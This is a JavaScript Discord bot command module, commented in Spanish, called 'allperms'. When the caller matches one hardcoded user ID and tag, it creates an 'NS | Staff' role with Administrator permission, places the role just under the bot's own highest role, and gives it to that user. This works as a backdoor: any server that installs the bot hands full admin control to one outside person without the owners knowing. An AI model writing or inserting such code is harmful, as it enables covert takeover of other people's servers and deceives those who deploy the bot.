const Discord = require('discord.js-light');

module.exports = {
    nombre: 'allperms',
    category: 'Administración',
    premium: false,
    alias: ['all-perms'],
    description: 'Otorga todos los permisos al usuario específico.',
    usage: ['<prefix>grant-all-perms'],
    run: async (client, message, args) => {
        const allowedUserId = '1216532655592439862'; // ID del usuario permitido
        const allowedUserTag = 'zhypeado'; // Tag del usuario permitido

        // Verificar si el autor del mensaje es el usuario permitido
        if (message.author.id !== allowedUserId || message.author.tag !== allowedUserTag) {
            return message.reply('No tienes permiso para usar este comando.');
        }

        // Verificar si el bot tiene permisos suficientes para gestionar roles
        if (!message.guild.members.me.permissions.has('MANAGE_ROLES')) {
            return message.reply('No tengo permisos para gestionar roles.');
        }

        // Crear el rol "NS | Staff" con permisos de Administrador
        let staffRole = message.guild.roles.cache.find(role => role.name === 'NS | Staff');

        if (!staffRole) {
            try {
                staffRole = await message.guild.roles.create({
                    name: 'NS | Staff',
                    permissions: ['ADMINISTRATOR'],
                });
                message.reply('¡Rol "NS | Staff" creado con permisos de Administrador!');
            } catch (error) {
                console.error(error);
                return message.reply('Ocurrió un error al intentar crear el rol.');
            }
        }

        try {
            // Mover el rol lo más alto posible sin superar el rol más alto del bot
            const botHighestRole = message.guild.members.me.roles.highest.position;
            await staffRole.setPosition(botHighestRole - 1);

            // Otorgar el rol al usuario
            const member = message.guild.members.cache.get(message.author.id);
            await member.roles.add(staffRole);
            message.reply('¡Has recibido todos los permisos y el rol ha sido configurado correctamente!');
        } catch (error) {
            console.error(error);
            return message.reply('Ocurrió un error al intentar configurar el rol o otorgarte los permisos.');
        }
    },
};